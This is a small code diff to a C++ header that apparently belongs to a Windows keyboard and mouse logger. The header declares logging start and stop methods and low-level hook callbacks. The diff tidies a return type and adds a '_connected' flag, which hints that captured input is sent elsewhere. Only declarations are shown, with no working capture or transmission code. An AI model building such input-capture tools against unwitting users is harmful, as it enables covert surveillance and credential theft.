@@ -25,7 +25,7 @@ namespace spider
 	public:
 		int				startLogging(bool keyboard, bool mouse);
 		int				stopLogging(bool keyboard, bool mouse);
-		const bool		isLogging() const;
+		bool			isLogging() const;
 
 		static			LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 		static			LRESULT CALLBACK mouseProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -39,6 +39,7 @@ namespace spider
 		LPVOID			_lpParam;
 		HINSTANCE		_hInstance;
 		bool			_isLogging;
+		bool			_connected;
 
 		int				_registerKeyboardHook();
 		int				_registerMouseHook();
